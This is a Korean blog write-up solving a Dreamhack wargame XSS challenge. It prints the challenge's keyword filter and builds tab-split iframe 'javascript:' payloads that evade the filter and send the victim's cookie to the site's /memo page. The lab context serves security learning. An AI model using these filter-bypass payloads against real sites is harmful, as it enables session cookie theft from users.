---
title: "드림핵 lv.1 - XSS Filtering Bypass Advanced"
date: 2025-03-14 00:10:00 +0800
categories: [Wargame, Dreamhack]
tags: [cyber security, writeup, dreamhack, web hacking, xss] 
description: 드림핵 XSS Filtering Bypass Advanced 웹해킹 워게임 풀이
---

[https://dreamhack.io/wargame/challenges/434](https://dreamhack.io/wargame/challenges/434)
# 문제 설명
[Exercise: XSS Filtering Bypass](https://dreamhack.io/wargame/challenges/433)의 패치된 문제입니다.

---
# 문제 풀이
해당 문제는 이 전에 풀이했던 [XSS Filtering Bypass](https://hoonsooni.com/posts/dreamhack_xss_filtering_bypass/)와 거의 같은 문제이기 때문에 따로 분석하는 과정은 담지 않기로 하였다. 
## 전 문제와 다른 필터링
```python
def xss_filter(text):
    _filter = ["script", "on", "javascript"]
    for f in _filter:
        if f in text.lower():
            return "filtered!!!"

    advanced_filter = ["window", "self", "this", "document", "location", "(", ")", "&#"]
    for f in advanced_filter:
        if f in text.lower():
            return "filtered!!!"

    return text
```
해당 문제의 코드에서 유일하게 이 전 문제와 다른 부분이다. <br />
문제 이름에도 나와있듯 지난 번에 풀이했던 문제에 필터링이 더해진 문제이다.
## 최종 풀이
```html
<script>document[location].href = "/memo?memo=" + document.cookie;</script>
```
우리가 최종적으로 실행해야 하는 코드는 이러하다.
### 필터링에 걸리는 키워드들
이 전에는 "script", "on", "javascript" 문자열이 발견될 때 공백으로 치환하는 필터링이여서 우회하기 굉장히 쉬웠는데 이제는 아예 사용할 수 없게 됐다. param 입력 값에 아예 해당 문자열들이 존재하면 안되는 상황이다.<br />

```python
["window", "self", "this", "document", "location", "(", ")", "&#"]
```
게다가 advanced_filter까지 새로 생기는 바람에 우회에 도움이 되는 많은 키워드들도 사용할 수가 없게 됐다.
### 우회법
> 참고로 /vuln 페이지에 접속해서 param 값을 계속 바꿔가면서 시도해보면 내가 작성한 스크립트가 필터되는지 아닌지 확인하는 것이 가능하다.

너무 막막한데 이럴 때일수록 차근차근 하나씩 우회법을 생각해내면 된다.<br />
#### iframe src 속성에 스키마 이용하기
```html
<iframe src="javas%09cript:alert`1`" />
```
우선 `script`와 `on`이 막혀있기 때문에 script 대신에 iframe을 사용했다. img같은 태그를 사용하면 이벤트 핸들러를 사용해야해서 곤란하다.<br />

iframe에는 src 속성에 `javascript:` 스키마를 이용해서 코드를 실행할 수 있는데 이때 javascript 또한 막혀있기 때문에 이를 우회하기 위해 중간의 탭(%09)을 넣어주었다.<br />

이렇게 하면 의도한 대로 alert 창이 뜨면서 스크립트가 먹힌다는 것을 알 수 있다.
#### document.location.href
```html
<iframe src="javas%09cript:docum%09ent.locatio%09n.href='/memo?memo='+docum%09ent.cookie" />
```
필터링 함수에서 입력 값 내부의 space 혹은 tab을 없애거나 감지하는 코드가 없기 때문에 필터링에 걸리는 문자열 사이사이에 탭을 적절히 넣어주어 필터링을 피할 수 있다.<br />

이런식으로 코드를 작성해서 `/vuln?param=`으로 값을 보내보면 우선 필터링에 걸리지 않는다는 것은 확인할 수 있다.<br />
### 공격 시도
이제 /flag 페이지에 접속해서 위 코드를 그대로 입력하여 보내고 /memo 페이지에 접속하면 아무일도 일어나지 않는다. 페이로드에 문제가 있다는 의미이다.
#### URL 인코딩 문제
아까 /vuln 페이지에서 시도했을 때에는 브라우저의 URL 인코딩 덕에 %09가 자동으로 \t으로 변환되기 때문에 문제가 없었다.<br />
하지만 /flag 페이지처럼 POST로 값을 보낼 때에는 당연하게도 URL이 아니기 때문에 %09가 탭으로 변환되지 않고 "%09"가 그대로 입력돼 작동하지 않은 것이다. 

```html
<iframe src="javas cript:docum ent.locatio n.href='/memo?memo='+docum ent.cookie" />
```
이렇게 중간에 "%09"가 아니라 진짜 탭을 넣어주어 페이로드를 작성해 제출하면 /memo 페이지에서 플래그 확인이 가능하다.<br />

참고로 본인은 메모장을 이용해서 탭을 입력했다. 브라우저에서 탭을 누르면 다음 input box로 포커싱이 가기 때문에 입력이 불가하다.
# 배운 것
URL 인코딩 개념에 대해서 알고는 있었지만 실제로 어떤 때에 이 개념이 필요한지 몰랐다. 이 문제를 통해서 조금이나마 배울 수 있었다.